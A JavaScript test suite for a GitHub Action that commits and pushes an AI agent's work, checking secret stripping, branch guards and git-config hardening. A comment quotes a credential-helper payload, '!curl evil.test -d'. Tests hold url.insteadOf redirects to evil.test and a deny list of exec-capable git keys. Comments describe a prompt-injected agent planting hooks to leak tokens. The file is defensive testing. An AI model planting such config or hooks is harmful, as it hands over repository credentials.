import { test, describe } from "node:test"
import assert from "node:assert/strict"
import { execFileSync } from "node:child_process"
import { mkdtempSync, rmSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
	shouldPushWork,
	changedPaths,
	splitPushable,
	renderPushNote,
	authoredByUs,
	needsCheckout,
	isSameRepo,
	pushCredentialEnv,
	unexpectedConfigKeys,
	CONFIG_READ_ARGS,
	trustedGitPath,
	gitEnvFrom,
	GIT_SAFE_ARGS,
	pushUrlFor,
	BOT_EMAIL,
} from "../src/push-work.mjs"

const live = { preview: false, sameRepo: true, branch: "feat/x", headAuthorEmail: "dev@example.com", onWantedCommit: true }

describe("shouldPushWork — the approved work must survive the runner", () => {
	test("a live run on the pull request's own branch pushes", () => {
		assert.equal(shouldPushWork(live).ok, true)
	})

	/**
	 * A preview run is the proposal pass. The brain refuses every write tool,
	 * so there should be nothing to push — but if a shell command wrote
	 * something anyway, pushing it would break the one promise the proposal
	 * makes: "nothing is written until you say go".
	 */
	test("a preview run never pushes", () => {
		assert.equal(shouldPushWork({ ...live, preview: true }).ok, false)
		assert.match(shouldPushWork({ ...live, preview: true }).why, /preview/i)
	})

	test("a fork's branch is never pushed to", () => {
		assert.equal(shouldPushWork({ ...live, sameRepo: false }).ok, false)
	})

	test("no branch to push to is a no", () => {
		assert.equal(shouldPushWork({ ...live, branch: "" }).ok, false)
	})

	/**
	 * The loop guard. Our own push creates a commit; if that commit triggers a
	 * run that pushes again, the pull request fills with commits forever. One
	 * generation is enough: we never push on top of our own commit.
	 */
	test("a run triggered by our own commit does not push again", () => {
		assert.equal(shouldPushWork({ ...live, headAuthorEmail: BOT_EMAIL }).ok, false)
		assert.match(shouldPushWork({ ...live, headAuthorEmail: BOT_EMAIL }).why, /own commit/i)
	})

	test("the bot email check ignores case and spacing", () => {
		assert.equal(authoredByUs(`  ${BOT_EMAIL.toUpperCase()} `), true)
		assert.equal(authoredByUs("dev@example.com"), false)
		assert.equal(authoredByUs(undefined), false)
	})
})

describe("changedPaths — reading git status", () => {
	test("reads modified, added and untracked paths", () => {
		const porcelain = [" M tests/pricing.spec.js", "A  tests/new.spec.js", "?? tests/extra.spec.js"].join("\n")
		assert.deepEqual(changedPaths(porcelain), ["tests/pricing.spec.js", "tests/new.spec.js", "tests/extra.spec.js"])
	})

	test("a rename reports where the file landed, not where it came from", () => {
		assert.deepEqual(changedPaths("R  old/a.js -> new/a.js"), ["new/a.js"])
	})

	test("a quoted path with a space is unquoted", () => {
		assert.deepEqual(changedPaths('?? "tests/my file.spec.js"'), ["tests/my file.spec.js"])
	})

	test("a deleted file still counts — removing a test is a change worth keeping", () => {
		assert.deepEqual(changedPaths(" D tests/gone.spec.js"), ["tests/gone.spec.js"])
	})

	test("empty status means nothing changed", () => {
		assert.deepEqual(changedPaths(""), [])
		assert.deepEqual(changedPaths("\n  \n"), [])
	})
})

describe("splitPushable — what we refuse to commit", () => {
	test("source and tests are pushable", () => {
		const { push, skip } = splitPushable(["tests/pricing.spec.js", "src/pricing.js", "playwright.config.ts"])
		assert.deepEqual(push, ["tests/pricing.spec.js", "src/pricing.js", "playwright.config.ts"])
		assert.deepEqual(skip, [])
	})

	/**
	 * `git add` already honours .gitignore, so this is the second line of
	 * defence, for a repository that does not ignore these. A pushed .env is
	 * the worst outcome in this whole feature — it publishes a credential to
	 * the customer's own history, where deleting it does not take it back.
	 */
	test("an environment file is never committed", () => {
		const { push, skip } = splitPushable([".env", "tests/a.spec.js", "config/.env.local"])
		assert.deepEqual(push, ["tests/a.spec.js"])
		assert.deepEqual(skip, [".env", "config/.env.local"])
	})

	test("dependencies and run output are never committed", () => {
		const { skip } = splitPushable([
			"node_modules/left-pad/index.js",
			"playwright-report/index.html",
			"test-results/trace.zip",
			"debug.log",
			".testcompanion/logs/run.log",
		])
		assert.equal(skip.length, 5)
	})

	test("a file whose name merely contains a skipped word is kept", () => {
		const { push } = splitPushable(["src/env.js", "tests/node_modules_helper.spec.js"])
		assert.deepEqual(push, ["src/env.js", "tests/node_modules_helper.spec.js"])
	})
})

describe("renderPushNote — the reader must see exactly what landed", () => {
	test("names the branch and every file", () => {
		const note = renderPushNote({ branch: "feat/x", sha: "abc1234", files: ["tests/a.spec.js", "src/b.js"] })
		assert.match(note, /feat\/x/)
		assert.match(note, /abc1234/)
		assert.match(note, /tests\/a\.spec\.js/)
		assert.match(note, /src\/b\.js/)
	})

	test("says what it refused to commit, rather than dropping it silently", () => {
		const note = renderPushNote({ branch: "feat/x", sha: "abc1234", files: ["tests/a.spec.js"], skipped: [".env"] })
		assert.match(note, /\.env/)
	})

	test("a failed push says so instead of claiming the work landed", () => {
		const note = renderPushNote({ branch: "feat/x", files: ["tests/a.spec.js"], error: "permission denied" })
		assert.match(note, /permission denied/)
		assert.doesNotMatch(note, /pushed/i)
	})
})

describe("needsCheckout — the run must happen on the branch it writes to", () => {
	/**
	 * main.mjs already detaches onto the pull request's commit when it resolves
	 * a comment's issue number, but that fetch is advisory — it warns and
	 * carries on so a proposal can still be built. This is what turns "we tried
	 * to be on the right commit" into "we are", before anything is pushed.
	 */
	test("a checkout sitting on another commit needs switching", () => {
		assert.equal(needsCheckout({ headSha: "7cab305", wantSha: "54ceef4" }), true)
	})

	test("already on the right commit needs nothing", () => {
		assert.equal(needsCheckout({ headSha: "54ceef4", wantSha: "54ceef4" }), false)
	})

	test("comparison ignores case and short-vs-long form", () => {
		assert.equal(
			needsCheckout({
				headSha: "54CEEF419D7290183E8F6467863D8A92F4E24029",
				wantSha: "54ceef419d7290183e8f6467863d8a92f4e24029",
			}),
			false,
		)
	})

	test("not knowing where we want to be is not a reason to move", () => {
		assert.equal(needsCheckout({ headSha: "7cab305", wantSha: "" }), false)
		assert.equal(needsCheckout({ headSha: "7cab305" }), false)
	})
})

describe("shouldPushWork — the two fail-open holes a review caught", () => {
	/**
	 * `sameRepo` was hard-coded true at the call site, on the reasoning that
	 * plan-run.mjs already skips forks. True today; a hard-coded security
	 * value is wrong the moment the code around it moves, and this is the
	 * second time this exact shape has appeared in this Action — the first was
	 * `pull_request_target` failing open on a deleted fork.
	 */
	test("not knowing whose repository this is refuses the push", () => {
		assert.equal(shouldPushWork({ ...live, sameRepo: undefined }).ok, false)
		assert.equal(shouldPushWork({ ...live, sameRepo: "yes" }).ok, false)
	})

	/**
	 * The checkout is advisory — a run continues against whatever is there so
	 * the proposal still gets built. But pushing from the wrong tree would
	 * send the DEFAULT branch's content to the pull request's branch and
	 * clobber the change under review.
	 */
	test("a tree that is not on the wanted commit never pushes", () => {
		assert.equal(shouldPushWork({ ...live, onWantedCommit: false }).ok, false)
		assert.match(shouldPushWork({ ...live, onWantedCommit: false }).why, /commit/i)
	})

	test("not knowing which commit we are on refuses the push", () => {
		assert.equal(shouldPushWork({ ...live, onWantedCommit: undefined }).ok, false)
	})
})

describe("shouldPushWork — never the default branch", () => {
	/**
	 * The branch name comes from the pull request's own head ref, which its
	 * author controls. Same-repo plus on-the-right-commit already bound that,
	 * but the default branch is the one target where a mistake is not
	 * recoverable by closing a pull request — so it is refused by name.
	 */
	test("a pull request branch is fine", () => {
		assert.equal(shouldPushWork({ ...live, branch: "feat/x", defaultBranch: "main" }).ok, true)
	})

	test("the default branch is refused", () => {
		const r = shouldPushWork({ ...live, branch: "main", defaultBranch: "main" })
		assert.equal(r.ok, false)
		assert.match(r.why, /default branch/i)
	})

	test("the refusal ignores case", () => {
		assert.equal(shouldPushWork({ ...live, branch: "Main", defaultBranch: "main" }).ok, false)
	})

	test("not knowing the default branch does not block an ordinary push", () => {
		assert.equal(shouldPushWork({ ...live, branch: "feat/x" }).ok, true)
	})
})

describe("changedPaths — the bug a live run found that 345 unit tests did not", () => {
	/**
	 * Run 40845669513. The Action wrote ten passing tests and then could not
	 * save them: "pathspec 'ests/pricing.spec.js' did not match any files".
	 *
	 * `git status --porcelain` puts a SPACE in the first column for an
	 * unstaged modification, so the line is " M tests/pricing.spec.js" — three
	 * characters before the path. The caller trimmed git's whole stdout, which
	 * removed that leading space from the FIRST LINE ONLY, leaving a two-
	 * character prefix and a fixed slice(3) that ate the "t".
	 *
	 * Both ends are fixed: the caller no longer trims, and this parse no
	 * longer assumes a fixed width. The tests passed before because they all
	 * fed it well-formed porcelain — the corruption happened upstream.
	 */
	test("a first line whose leading space was trimmed away still parses", () => {
		assert.deepEqual(changedPaths("M tests/pricing.spec.js"), ["tests/pricing.spec.js"])
	})

	test("the untrimmed form parses identically", () => {
		assert.deepEqual(changedPaths(" M tests/pricing.spec.js"), ["tests/pricing.spec.js"])
	})

	test("a mixed block where only the first line lost its space", () => {
		const corrupted = ["M tests/pricing.spec.js", " M src/pricing.js", "?? tests/new.spec.js"].join("\n")
		assert.deepEqual(changedPaths(corrupted), ["tests/pricing.spec.js", "src/pricing.js", "tests/new.spec.js"])
	})

	test("every two-letter status code is handled", () => {
		for (const code of ["MM", "A ", " A", "AM", "RM", "??", "UU", " D", "D "]) {
			assert.deepEqual(changedPaths(`${code} some/file.js`), ["some/file.js"], `status ${JSON.stringify(code)}`)
		}
	})

	test("a path that itself begins with a space survives, because it is quoted", () => {
		assert.deepEqual(changedPaths('?? " leading.spec.js"'), [" leading.spec.js"])
	})
})

describe("isSameRepo — whose branch is this, really", () => {
	/**
	 * Run 40857884973 refused to save with "the change does not come from this
	 * repository", on a branch in this very repository.
	 *
	 * The caller read the head repository off the pull request object that
	 * main.mjs fetches — but it only fetches that for a COMMENT event, where a
	 * PR number has to be resolved to a head sha. On a pull_request event the
	 * sha is already in the payload, so nothing was fetched, the answer was
	 * undefined, and undefined is a refusal. The head repository was in the
	 * event payload the whole time.
	 */
	test("the same repository, compared case-insensitively", () => {
		assert.equal(isSameRepo("Acme/Shop", "acme/shop"), true)
		assert.equal(isSameRepo("acme/shop", "acme/shop"), true)
	})

	test("a fork is not this repository", () => {
		assert.equal(isSameRepo("someone/shop", "acme/shop"), false)
	})

	test("not knowing is a refusal, never an assumption", () => {
		assert.equal(isSameRepo(undefined, "acme/shop"), undefined)
		assert.equal(isSameRepo("", "acme/shop"), undefined)
		assert.equal(isSameRepo("acme/shop", ""), undefined)
	})
})

describe("changedPaths — paths git had to escape", () => {
	/**
	 * Reported in review of PR #3101, and reproduced: with `core.quotePath` on
	 * (the default) git octal-escapes non-ASCII bytes, so `café.spec.ts` comes
	 * out as `"caf\\303\\251.spec.ts"`. Stripping the quotes without decoding
	 * leaves a path that does not exist, and `git add` with several pathspecs
	 * ABORTS ON THE FIRST MISS and stages nothing — so one accented filename
	 * loses every file the run produced.
	 *
	 * The call site now passes `-c core.quotePath=false`, which stops the
	 * escaping at source. This decodes it anyway, so a repository that forces
	 * the setting back on cannot reintroduce it.
	 *
	 * The old test picked the one quoted input that round-trips — a path with
	 * a space, which git quotes but does not escape — so the suite was green
	 * right beside the bug.
	 */
	test("an octal-escaped non-ASCII path is decoded back to its real name", () => {
		assert.deepEqual(changedPaths('?? "caf\\303\\251.spec.ts"'), ["café.spec.ts"])
	})

	test("a quoted path with a space still works — the case that used to pass", () => {
		assert.deepEqual(changedPaths('?? "my file.spec.js"'), ["my file.spec.js"])
	})

	test("escaped quotes and backslashes come back as themselves", () => {
		assert.deepEqual(changedPaths('?? "say \\"hi\\".spec.js"'), ['say "hi".spec.js'])
		assert.deepEqual(changedPaths('?? "back\\\\slash.spec.js"'), ["back\\slash.spec.js"])
	})

	test("an unquoted path is left exactly as it is", () => {
		assert.deepEqual(changedPaths("?? plain.spec.js"), ["plain.spec.js"])
		assert.deepEqual(changedPaths("?? caf\u00e9.spec.ts"), ["café.spec.ts"])
	})

	test("a rename to an escaped path reports the decoded destination", () => {
		assert.deepEqual(changedPaths('R  old.js -> "caf\\303\\251.spec.ts"'), ["café.spec.ts"])
	})
})

describe("changedPaths — characters outside the basic plane", () => {
	/**
	 * The decoder walked the string by UTF-16 code unit and ran Buffer.from on
	 * each one, so an astral character — an emoji — was split into its two
	 * surrogate halves and each half became U+FFFD:
	 *
	 *   "my 🎉 file.spec.ts"  ->  "my \uFFFD\uFFFD file.spec.ts"
	 *
	 * Reachable BECAUSE of the other half of the fix: with
	 * `core.quotePath=false` git stops octal-escaping non-ASCII but still
	 * QUOTES a path containing a space, so an emoji in a spaced filename
	 * arrives raw inside quotes and goes through this branch. The result is a
	 * path that does not exist, `git add` aborts, and the whole approved run's
	 * work is lost — the original bug, reached through the setting added to
	 * prevent it.
	 *
	 * BMP characters like é survived, which is why the first round of tests
	 * passed.
	 */
	test("an emoji in a quoted path survives", () => {
		assert.deepEqual(changedPaths('?? "my 🎉 file.spec.ts"'), ["my 🎉 file.spec.ts"])
	})

	test("an emoji that git DID escape also survives", () => {
		// 🎉 is f0 9f 8e 89.
		assert.deepEqual(changedPaths('?? "p\\360\\237\\216\\211q.spec.ts"'), ["p🎉q.spec.ts"])
	})

	test("mixed astral, accented and plain in one path", () => {
		assert.deepEqual(changedPaths('?? "caf\u00e9 🎉 ok.spec.ts"'), ["café 🎉 ok.spec.ts"])
	})
})

describe("the App token has to reach git, not just gh", () => {
	/**
	 * Reported in review of PR #3101. action.yml and the starter both tell
	 * customers they can delete the `permissions:` block once the App is
	 * installed, "because the App's installation token carries these
	 * permissions itself". The token was put in GH_TOKEN, which only `gh`
	 * reads — the push is a plain `git push` authenticating with whatever
	 * actions/checkout left in .git/config.
	 *
	 * So following our own advice, on an org whose default workflow token is
	 * read-only, made every approved run fail its push with a 403.
	 *
	 * Passed as config rather than written into the remote URL: a token in a
	 * URL ends up in the reflog, in error messages and in `git remote -v`.
	 */
	const URL = "https://github.com/acme/shop.git"

	test("builds a basic auth header SCOPED to the push url", () => {
		const got = pushCredentialEnv("ghs_abc123", URL)
		assert.equal(got.GIT_CONFIG_KEY_0, "http.https://github.com/acme/shop.git.extraheader")
		const b64 = got.GIT_CONFIG_VALUE_0.split("basic ")[1]
		assert.equal(Buffer.from(b64, "base64").toString("utf8"), "x-access-token:ghs_abc123")
	})

	/**
	 * `url.<base>.insteadOf` in the repository's own config — which the agent
	 * can write — redirects a push to another host. Verified: one line turns
	 * github.com into evil.test. A GLOBAL header follows it there and hands
	 * over the App's installation token.
	 */
	test("the header is never global", () => {
		const got = pushCredentialEnv("ghs_abc123", URL)
		assert.notEqual(got.GIT_CONFIG_KEY_0, "http.extraheader")
		assert.match(got.GIT_CONFIG_KEY_0, /^http\.https:\/\/github\.com\/acme\/shop\.git\.extraheader$/)
	})

	test("no token, or no url, means no credential", () => {
		assert.deepEqual(pushCredentialEnv(undefined, URL), {})
		assert.deepEqual(pushCredentialEnv("", URL), {})
		assert.deepEqual(pushCredentialEnv("ghs_abc123", ""), {})
		assert.deepEqual(pushCredentialEnv("ghs_abc123", undefined), {})
	})

	test("the token itself is never passed in the clear", () => {
		const got = pushCredentialEnv("ghs_secret", URL)
		assert.ok(
			!Object.values(got).some((v) => v.includes("ghs_secret")),
			`the raw token appeared in ${JSON.stringify(got)}`,
		)
	})

	test("the push url comes from the repository NAME, not from git config", () => {
		assert.equal(pushUrlFor("acme/shop"), "https://github.com/acme/shop.git")
		assert.equal(pushUrlFor("acme/shop", "https://ghe.corp/"), "https://ghe.corp/acme/shop.git")
	})

	test("a repository name we cannot read gives no url, so no push", () => {
		for (const bad of ["", "   ", "acme", "acme/shop/extra", undefined, "acme shop"]) {
			assert.equal(pushUrlFor(bad), undefined, `accepted ${JSON.stringify(bad)}`)
		}
	})
})

describe("our own git commands must not carry secrets or run hooks", () => {
	/**
	 * These commands run AFTER the agent, which has had --yolo write access to
	 * the working tree. spawnSync with no `env` inherits everything, so an
	 * agent that wrote .git/hooks/pre-commit would have it executed by our
	 * `git commit` with TC_ACTION_APP_PRIVATE_KEY, GH_TOKEN and the customer's
	 * BrowserStack key in its environment. On pull_request_target the diff is
	 * attacker-authored, so that is one prompt injection from a key leaving
	 * the runner. Reported by the security review of this change.
	 */
	const dirty = {
		PATH: "/usr/bin",
		HOME: "/home/runner",
		HTTPS_PROXY: "http://proxy:8080",
		TC_ACTION_APP_PRIVATE_KEY: "-----BEGIN PRIVATE KEY-----",
		TC_ACTION_APP_ID: "12345",
		GH_TOKEN: "ghs_secret",
		BROWSERSTACK_ACCESS_KEY: "bs_secret",
		GITHUB_TOKEN: "ghp_secret",
	}

	test("no secret survives", () => {
		const got = gitEnvFrom(dirty)
		for (const k of [
			"TC_ACTION_APP_PRIVATE_KEY",
			"TC_ACTION_APP_ID",
			"GH_TOKEN",
			"BROWSERSTACK_ACCESS_KEY",
			"GITHUB_TOKEN",
		]) {
			assert.equal(got[k], undefined, `${k} reached git`)
		}
		assert.ok(!JSON.stringify(got).includes("secret"), `a secret value leaked: ${JSON.stringify(got)}`)
	})

	test("what git actually needs survives", () => {
		const got = gitEnvFrom(dirty)
		// PATH is pinned rather than inherited — see the hijack test below.
		assert.equal(got.PATH, "/usr/bin:/bin")
		assert.equal(got.HOME, "/home/runner")
		assert.equal(got.HTTPS_PROXY, "http://proxy:8080", "a push has to reach the network")
	})

	test("an empty environment still disables the system and user config", () => {
		// Nothing is inherited, and git is told to ignore /etc/gitconfig and
		// ~/.gitconfig too, so the only configuration in play is what this
		// process passes with -c.
		for (const got of [gitEnvFrom({}), gitEnvFrom()]) {
			assert.equal(got.GIT_CONFIG_NOSYSTEM, "1")
			assert.equal(got.GIT_CONFIG_GLOBAL, "/dev/null")
			assert.equal(got.GIT_TERMINAL_PROMPT, "0")
			assert.equal(got.GIT_ASKPASS, "")
			assert.equal(got.SSH_ASKPASS, "")
			assert.equal(got.GIT_ATTR_NOSYSTEM, "1")
			// Nothing was inherited: every key is one we set deliberately.
			assert.ok(Object.keys(got).every((k) => k.startsWith("GIT_") || k === "SSH_ASKPASS" || k === "PATH"))
		}
	})

	/**
	 * Every one of these is a way the REPOSITORY can ask git to run a program
	 * on our behalf, and the agent can write all of them. Asserted by name so
	 * removing one is a failing test rather than a quiet loss.
	 */
	test("every exec-capable config key is pinned shut", () => {
		const settings = GIT_SAFE_ARGS.filter((a) => a !== "-c")
		for (const key of [
			"core.hooksPath=/dev/null",
			"core.fsmonitor=false",
			"core.sshCommand=",
			"core.pager=cat",
			"diff.external=",
			"commit.gpgsign=false",
			"gpg.program=false",
			"core.attributesFile=/dev/null",
			"credential.helper=",
			"core.askPass=",
			"protocol.allow=never",
			"protocol.https.allow=always",
			"http.proxy=",
			"core.gitProxy=",
		]) {
			assert.ok(settings.includes(key), `${key} is not pinned: ${JSON.stringify(settings)}`)
		}
	})

	test("they are passed as -c pairs, so git reads them as config", () => {
		assert.equal(GIT_SAFE_ARGS.length % 2, 0)
		for (let i = 0; i < GIT_SAFE_ARGS.length; i += 2) {
			assert.equal(GIT_SAFE_ARGS[i], "-c")
		}
	})
})

/**
 * The agent runs with --yolo write access to the tree, and `.git/config` is
 * part of the tree it can write. Two separate things go wrong there, so there
 * are two separate defences.
 */
describe("the repository's own git config must not steer the push", () => {
	test("a redirect is refused — insteadOf rewrites even an explicit URL", () => {
		// Verified against real git: `git push https://github.com/acme/shop.git`
		// with url."https://evil.test/".insteadOf "https://github.com/" set
		// reports `failed to push some refs to 'https://evil.test/acme/shop.git'`.
		// Naming the URL on the command line is NOT enough.
		assert.deepEqual(unexpectedConfigKeys("url.https://evil.test/.insteadOf\ncore.bare"), [
			"url.https://evil.test/.insteadOf",
		])
		assert.deepEqual(unexpectedConfigKeys("url.https://evil.test/.pushInsteadOf"), [
			"url.https://evil.test/.pushInsteadOf",
		])
	})

	test("a credential helper is refused — git runs it as a shell command", () => {
		// `credential.helper=!curl evil.test -d` executes on the first 401.
		assert.deepEqual(unexpectedConfigKeys("credential.helper"), ["credential.helper"])
	})

	test("the keys that run a program are refused", () => {
		for (const key of [
			"core.sshCommand",
			"core.gitProxy",
			"core.hooksPath",
			"core.fsmonitor",
			"core.pager",
			"core.askPass",
			"filter.lfs.clean",
			"filter.evil.process",
			"diff.external",
			"diff.evil.textconv",
			"gpg.program",
			"uploadpack.packObjectsHook",
			"sequence.editor",
			"pager.diff",
			"protocol.ext.allow",
			"remote.origin.uploadpack",
			"http.proxy",
			"include.path",
			"includeIf.gitdir:/x.path",
		]) {
			assert.deepEqual(unexpectedConfigKeys(key), [key], `${key} must be refused`)
		}
	})

	test("case does not matter — git lowercases section and key names", () => {
		assert.deepEqual(unexpectedConfigKeys("CREDENTIAL.HELPER"), ["CREDENTIAL.HELPER"])
		assert.deepEqual(unexpectedConfigKeys("CORE.FILEMODE"), [])
	})

	/**
	 * The point of an allow list: a key nobody has thought about yet is
	 * refused without anyone having to add it. git gains config keys with
	 * every release, and several of them run programs.
	 */
	test("a key we have never heard of is refused by default", () => {
		assert.deepEqual(unexpectedConfigKeys("some.future.hook"), ["some.future.hook"])
		assert.deepEqual(unexpectedConfigKeys("http.sslVerify"), ["http.sslVerify"])
		assert.deepEqual(unexpectedConfigKeys("http.curloptResolve"), ["http.curloptResolve"])
		assert.deepEqual(unexpectedConfigKeys("core.worktree"), ["core.worktree"])
		assert.deepEqual(unexpectedConfigKeys("extensions.worktreeConfig"), ["extensions.worktreeConfig"])
	})

	test("a bare http.extraheader is refused; only a scoped one is expected", () => {
		assert.deepEqual(unexpectedConfigKeys("http.extraheader"), ["http.extraheader"])
		assert.deepEqual(unexpectedConfigKeys("http.https://github.com/.extraheader"), [])
	})

	/**
	 * This is the half that decides whether the Action works at all. Every one
	 * of these is written by actions/checkout on a perfectly ordinary run, so
	 * refusing any of them would refuse every push we have ever made.
	 */
	test("an ordinary checkout is NOT refused", () => {
		const afterCheckout = [
			"core.repositoryformatversion",
			"core.filemode",
			"core.bare",
			"core.logallrefupdates",
			"remote.origin.url",
			"remote.origin.fetch",
			"http.https://github.com/.extraheader",
			"branch.main.remote",
			"branch.main.merge",
			"user.name",
			"user.email",
			// safe.directory is deliberately absent: actions/checkout writes it
			// to a TEMPORARY GLOBAL config, and we read local + worktree only.
			"gc.auto",
		].join("\n")
		assert.deepEqual(unexpectedConfigKeys(afterCheckout), [])
	})

	test("nothing in, nothing out", () => {
		for (const empty of ["", "   ", undefined, null]) assert.deepEqual(unexpectedConfigKeys(empty), [])
	})
})

describe("the credential travels in the environment, not in argv", () => {
	test("it is a scoped extraheader delivered through GIT_CONFIG_*", () => {
		const got = pushCredentialEnv("ghs_secret", "https://github.com/acme/shop.git")
		assert.equal(got.GIT_CONFIG_COUNT, "1")
		assert.equal(got.GIT_CONFIG_KEY_0, "http.https://github.com/acme/shop.git.extraheader")
		assert.equal(got.GIT_CONFIG_VALUE_0, `AUTHORIZATION: basic ${Buffer.from("x-access-token:ghs_secret").toString("base64")}`)
	})

	test("anyone running `ps` sees no token", () => {
		// argv is world-readable on the runner; /proc/<pid>/environ is not.
		const argv = ["push", "https://github.com/acme/shop.git", "HEAD:refs/heads/x"]
		assert.ok(!argv.join(" ").includes("ghs_secret"))
	})

	test("no token or no URL means no credential at all, never a half-formed one", () => {
		assert.deepEqual(pushCredentialEnv("", "https://github.com/a/b.git"), {})
		assert.deepEqual(pushCredentialEnv("ghs_x", ""), {})
		assert.deepEqual(pushCredentialEnv(undefined, undefined), {})
	})
})

/**
 * The agent writes to the runner as the same user we do, and several
 * directories on the default PATH are writable by that user. A planted `git`
 * earlier on PATH would be handed the installation token.
 */
describe("git itself must be the real git", () => {
	const exists = (p) => ["/usr/bin/git", "/bin/git"].includes(p)
	const notWritable = () => false

	test("an absolute, root-owned path is used, never a bare name", () => {
		assert.equal(trustedGitPath({ exists, canWrite: notWritable }), "/usr/bin/git")
	})

	test("a candidate WE can write is not trusted — that is the hijack", () => {
		const canWriteUsrBin = (p) => p === "/usr/bin/git"
		assert.equal(trustedGitPath({ exists, canWrite: canWriteUsrBin }), "/bin/git")
	})

	test("nothing trustworthy means nothing, not a fallback to PATH", () => {
		// A fallback to bare "git" would reintroduce exactly the hole this
		// closes, so the caller is made to handle the absence instead.
		assert.equal(trustedGitPath({ exists: () => false, canWrite: notWritable }), undefined)
		assert.equal(trustedGitPath({ exists, canWrite: () => true }), undefined)
	})

	test("PATH is pinned, not inherited — a planted directory cannot come along", () => {
		const got = gitEnvFrom({ PATH: "/home/runner/.local/bin:/usr/bin" })
		assert.equal(got.PATH, "/usr/bin:/bin")
	})
})

/**
 * Found by live run 41049398591, which refused to save with a list of
 * fifteen "unexpected" keys — every one of them a flag WE pass in
 * GIT_SAFE_ARGS.
 *
 * `git config --list` includes config given on the command line with `-c`.
 * So the check read our own hardening back and reported it as tampering,
 * which would have blocked every push the Action ever makes.
 *
 * This runs real git, because the bug was in what git returns, not in how
 * the listing is parsed — a fixture would have agreed with the broken code.
 */
describe("the config check reads the repository, not our own flags", () => {
	test("-c values do not come back as unexpected keys", () => {
		const dir = mkdtempSync(join(tmpdir(), "tc-config-"))
		try {
			execFileSync("git", ["init", "-q", dir])
			const listing = execFileSync(
				"git",
				[...GIT_SAFE_ARGS, "-C", dir, ...CONFIG_READ_ARGS],
				{ encoding: "utf8", env: gitEnvFrom({}) },
			)
			assert.deepEqual(
				unexpectedConfigKeys(listing),
				[],
				"a freshly initialised repository must be acceptable, with our own -c flags in play",
			)
		} finally {
			rmSync(dir, { recursive: true, force: true })
		}
	})
})
